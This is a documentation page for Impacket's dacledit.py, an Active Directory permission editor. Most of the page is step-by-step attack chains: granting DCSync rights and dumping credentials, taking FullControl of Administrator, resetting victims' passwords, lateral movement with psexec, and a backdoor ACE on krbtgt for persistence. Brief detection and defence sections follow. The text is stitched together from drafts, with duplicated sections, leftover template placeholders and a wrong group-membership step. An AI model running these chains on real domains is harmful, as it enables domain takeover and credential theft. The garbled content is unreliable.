# dacledit.py

## Overview
`dacledit.py` is a powerful DACL (Discretionary Access Control List) editor that allows reading and manipulating Access Control Entries (ACEs) on Active Directory objects. This tool is essential for privilege escalation attacks through DACL abuse and understanding object permissions in AD environments.

## Detailed Description
This script provides comprehensive functionality to read, write, remove, backup, and restore DACLs on Active Directory objects. It enables attackers to modify object permissions, grant themselves or controlled principals additional rights, and perform privilege escalation through DACL manipulation. The tool supports various rights including FullControl, ResetPassword, WriteMembers, and DCSync, making it valuable for both offensive operations and defensive auditing.

DACL abuse is a common post-exploitation technique where attackers modify object permissions to:
- Grant themselves control over high-value AD objects
- Reset passwords of privileged accounts
- Add users to privileged groups
- Grant DCSync rights for credential dumping
- Establish persistence through backdoored permissions

### Key Features:
- **DACL Reading**: Display current permissions on AD objects
- **DACL Writing**: Add new Access Control Entries with specific rights
- **DACL Removal**: Remove existing ACEs from object DACLs
- **DACL Backup/Restore**: Save and restore DACL configurations
- **Multiple Rights Support**: FullControl, ResetPassword, WriteMembers, DCSync, and custom GUIDs
- **Flexible Object Targeting**: Support for sAMAccountName, SID, and Distinguished Name
- **Inheritance Control**: Manage ACE inheritance for containers and OUs

### Technical Details:
- Utilizes LDAP protocol for Active Directory communication
- Implements proper DACL parsing and modification
- Supports both standard and extended rights via GUIDs
- Uses security descriptor control for DACL operations
- Compatible with both LDAP and LDAPS connectionserview
`dacledit.py` is a edit dacl permissions tool in the Impacket suite. This tool is categorized under Privilege Escalation and provides functionality for [specific use case].

## Detailed Description
## Detailed Description
This script provides comprehensive functionality to read, write, remove, backup, and restore DACLs on Active Directory objects. It enables attackers to modify object permissions, grant themselves or controlled principals additional rights, and perform privilege escalation through DACL manipulation. The tool supports various rights including FullControl, ResetPassword, WriteMembers, and DCSync, making it valuable for both offensive operations and defensive auditing.

DACL abuse is a common post-exploitation technique where attackers modify object permissions to:
- Grant themselves control over high-value AD objects
- Reset passwords of privileged accounts
- Add users to privileged groups
- Grant DCSync rights for credential dumping
- Establish persistence through backdoored permissions

### Key Features:
- **Feature 1**: Description of primary feature
- **Feature 2**: Description of secondary feature
- **Feature 3**: Description of additional feature
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication
- **Cross-Platform Compatibility**: Works with various Windows versions

### Technical Details:
- Uses [specific protocol/technique]
- Leverages [specific Windows API/service]
- Implements [specific attack technique]
- Compatible with [specific versions/systems]

## Command Line Options

```
usage: dacledit.py [-h] [-use-ldaps] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                   [-dc-ip ip address] [-dc-host hostname] [-principal NAME] [-principal-sid SID] 
                   [-principal-dn DN] [-target NAME] [-target-sid SID] [-target-dn DN]
                   [-action {read,write,remove,backup,restore}] [-file FILENAME] 
                   [-ace-type {allowed,denied}] [-rights {FullControl,ResetPassword,WriteMembers,DCSync}]
                   [-rights-guid RIGHTS_GUID] [-inheritance]
                   identity

Python editor for a principal's DACL.

Required Arguments:
  identity              domain.local/username[:password]

Connection Options:
  -use-ldaps            Use LDAPS instead of LDAP
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Authentication & Connection:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller
  -dc-host hostname     Hostname of the domain controller

Principal (attacker-controlled object):
  -principal NAME       sAMAccountName of principal
  -principal-sid SID    Security Identifier of principal
  -principal-dn DN      Distinguished Name of principal

Target (object to read/edit DACL of):
  -target NAME          sAMAccountName of target
  -target-sid SID       Security Identifier of target
  -target-dn DN         Distinguished Name of target

DACL Editor:
  -action {read,write,remove,backup,restore}
                        Action to operate on the DACL (default: read)
  -file FILENAME        Filename/path (optional for backup, required for restore)
  -ace-type {allowed,denied}
                        ACE Type to add or remove (default: allowed)
  -rights {FullControl,ResetPassword,WriteMembers,DCSync}
                        Rights to write/remove in target DACL (default: FullControl)
  -rights-guid RIGHTS_GUID
                        Manual GUID representing the right to write/remove
  -inheritance          Enable inheritance in ACE flag (useful for containers/OUs)
```
## Usage Examples

### Reading DACLs
```bash
# Read DACL of a specific user
python3 dacledit.py domain.local/user:password -target Administrator

# Read DACL using target SID
python3 dacledit.py domain.local/user:password -target-sid S-1-5-21-domain-500

# Read DACL using Distinguished Name
python3 dacledit.py domain.local/user:password -target-dn "CN=Administrator,CN=Users,DC=domain,DC=local"

# Read DACL with principal filter (show only ACEs for specific principal)
python3 dacledit.py domain.local/user:password -target Administrator -principal attacker
```

### Writing/Adding ACEs
```bash
# Grant FullControl to attacker on target user
python3 dacledit.py domain.local/user:password -action write -target victim -principal attacker -rights FullControl

# Grant ResetPassword right
python3 dacledit.py domain.local/user:password -action write -target victim -principal attacker -rights ResetPassword

# Grant WriteMembers right (for groups)
python3 dacledit.py domain.local/user:password -action write -target "Domain Admins" -principal attacker -rights WriteMembers

# Grant DCSync rights on domain root
python3 dacledit.py domain.local/user:password -action write -target-dn "DC=domain,DC=local" -principal attacker -rights DCSync

# Add custom right using GUID
python3 dacledit.py domain.local/user:password -action write -target victim -principal attacker -rights-guid 00299570-246d-11d0-a768-00aa006e0529
```

### Removing ACEs
```bash
# Remove FullControl ACE
python3 dacledit.py domain.local/user:password -action remove -target victim -principal attacker -rights FullControl

# Remove ResetPassword ACE
python3 dacledit.py domain.local/user:password -action remove -target victim -principal attacker -rights ResetPassword

# Remove specific ACE by GUID
python3 dacledit.py domain.local/user:password -action remove -target victim -principal attacker -rights-guid custom-guid
```

### DACL Backup and Restore
```bash
# Backup DACL to file
python3 dacledit.py domain.local/user:password -action backup -target victim -file victim_dacl_backup.json

# Restore DACL from file
python3 dacledit.py domain.local/user:password -action restore -target victim -file victim_dacl_backup.json

# Backup with specific filename
python3 dacledit.py domain.local/user:password -action backup -target "Domain Admins" -file domain_admins_backup.json
```

### Advanced Usage
```bash
# Use LDAPS connection
python3 dacledit.py domain.local/user:password -use-ldaps -target victim -principal attacker

# Use NTLM hash authentication
python3 dacledit.py domain.local/user -hashes :ntlmhash -target victim -principal attacker

# Use Kerberos authentication
python3 dacledit.py domain.local/user -k -target victim -principal attacker

# Enable inheritance for container objects
python3 dacledit.py domain.local/user:password -action write -target-dn "OU=Users,DC=domain,DC=local" -principal attacker -rights FullControl -inheritance

# Create denied ACE instead of allowed
python3 dacledit.py domain.local/user:password -action write -target victim -principal attacker -ace-type denied -rights FullControl
```

## Attack Chain Integration

### Privilege Escalation via DACL Abuse
```bash
# Step 1: Enumerate AD objects and permissions
python3 dacledit.py domain.local/user:password -target Administrator -action read

# Step 2: Grant yourself FullControl over high-value account
python3 dacledit.py domain.local/user:password -action write -target Administrator -principal user -rights FullControl

# Step 3: Reset target account password
python3 changepasswd.py domain.local/Administrator:newpassword@dc.domain.local -altuser user -altpass password
```

### DCSync Attack Setup
```bash
# Step 1: Grant DCSync rights to controlled account
python3 dacledit.py domain.local/user:password -action write -target-dn "DC=domain,DC=local" -principal user -rights DCSync

# Step 2: Perform DCSync attack
python3 secretsdump.py domain.local/user:password@dc.domain.local -just-dc
```

### Group Membership Manipulation
```bash
# Step 1: Grant WriteMembers right on Domain Admins group
python3 dacledit.py domain.local/user:password -action write -target "Domain Admins" -principal user -rights WriteMembers

# Step 2: Add user to Domain Admins group
python3 addcomputer.py domain.local/user:password -method SAMR -computer-name FAKE$ -computer-pass password
# Then use AD tools to add user to group

# Step 3: Verify membership and use elevated privileges
python3 secretsdump.py domain.local/user:password@dc.domain.local
```

### Password Reset Chain
```bash
# Step 1: Grant ResetPassword right on target account
python3 dacledit.py domain.local/user:password -action write -target victim -principal user -rights ResetPassword

# Step 2: Reset victim's password
python3 changepasswd.py domain.local/victim@dc.domain.local -newpass NewPassword123! -altuser user -altpass password

# Step 3: Use victim account for lateral movement
python3 psexec.py domain.local/victim:NewPassword123!@target.domain.local
```

### Persistence Through DACL Backdoors
```bash
# Step 1: Backup original DACL
python3 dacledit.py domain.local/admin:password -action backup -target krbtgt -file krbtgt_original.json

# Step 2: Add backdoor ACE to krbtgt account
python3 dacledit.py domain.local/admin:password -action write -target krbtgt -principal backdoor_user -rights FullControl

# Step 3: Use backdoor for persistence
python3 secretsdump.py domain.local/backdoor_user:password@dc.domain.local -just-dc

# Step 4: Clean up when needed
python3 dacledit.py domain.local/admin:password -action restore -target krbtgt -file krbtgt_original.json
```

### Container/OU Privilege Inheritance
```bash
# Step 1: Grant rights on OU with inheritance
python3 dacledit.py domain.local/user:password -action write -target-dn "OU=Servers,DC=domain,DC=local" -principal user -rights FullControl -inheritance

# Step 2: All computer objects in OU inherit permissions
# Step 3: Compromise any server in the OU
python3 psexec.py domain.local/user:password@server1.domain.local
```

## Prerequisites
- Python 3.x with Impacket installed
- Valid domain credentials (user level access minimum)
- Network access to domain controller via LDAP (389/tcp) or LDAPS (636/tcp)
- Understanding of Active Directory DACL structure and permissions
- Knowledge of target object identifiers (sAMAccountName, SID, or DN)

## DACL Rights Reference

### Standard Rights:
- **FullControl**: Complete control over the object
- **ResetPassword**: Ability to reset user account passwords
- **WriteMembers**: Ability to modify group membership
- **DCSync**: Replication rights for domain credential extraction

### Extended Rights GUIDs:
- **User-Force-Change-Password**: 00299570-246d-11d0-a768-00aa006e0529
- **DS-Replication-Get-Changes**: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
- **DS-Replication-Get-Changes-All**: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
- **User-Change-Password**: ab721a53-1e2f-11d0-9819-00aa0040529b

## Detection Considerations
- **Event IDs**:
  - 4670: Permissions on an object were changed
  - 4662: An operation was performed on an object
  - 5136: A directory service object was modified
  - 4728: A member was added to a security-enabled global group
- **LDAP Indicators**:
  - Unusual DACL modification requests
  - Privilege escalation patterns
  - Anomalous group membership changes
  - Security descriptor modifications
- **Behavioral Patterns**:
  - Low-privilege accounts gaining high-level permissions
  - Rapid succession of permission changes
  - Backdoor ACE creation patterns

## Defensive Measures
- **Access Control Monitoring**:
  - Deploy DACL change monitoring solutions
  - Implement alerting for privilege escalation attempts
  - Regular auditing of sensitive object permissions
- **Privileged Access Management**:
  - Implement just-in-time (JIT) access controls
  - Use privileged access workstations (PAWs)
  - Regular review of administrative group memberships
- **Active Directory Hardening**:
  - Enable advanced auditing for object access
  - Implement AdminSDHolder protection
  - Regular cleanup of unnecessary ACEs
  - Use of RBAC and least privilege principles

## Common Issues and Troubleshooting

### Access Denied Errors
```bash
# Error: "Access denied" when reading/writing DACLs
# Solution: Ensure user has appropriate permissions
# Check if user has Read/Write DACL permissions on target object
python3 dacledit.py domain.local/user:password -target object -action read -debug
```

### Object Not Found
```bash
# Error: "Object not found" with sAMAccountName
# Solution: Use Distinguished Name or SID instead
python3 dacledit.py domain.local/user:password -target-dn "CN=User,CN=Users,DC=domain,DC=local"
# Or find the correct identifier first
```

### LDAP Connection Issues
```bash
# Error: LDAP connection failures
# Solution: Try LDAPS or specify DC explicitly
python3 dacledit.py domain.local/user:password -use-ldaps -dc-ip 192.168.1.10 -target object
```

### Rights GUID Issues
```bash
# Error: Invalid rights GUID
# Solution: Verify GUID format and use standard rights when possible
python3 dacledit.py domain.local/user:password -target object -principal user -rights ResetPassword
# Instead of manual GUID unless specific extended right needed
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Extract credentials after DCSync rights granted
- [changepasswd.py](changepasswd.md) - Reset passwords after gaining ResetPassword rights
- [psexec.py](psexec.md) - Execute commands with escalated privileges
- [GetADUsers.py](GetADUsers.md) - Enumerate users for DACL analysis
- [owneredit.py](owneredit.md) - Modify object ownership for DACL control
- [addcomputer.py](addcomputer.md) - Add computer accounts for group manipulation

---

*This documentation is based on the actual source code and functionality of dacledit.py from Impacket.*
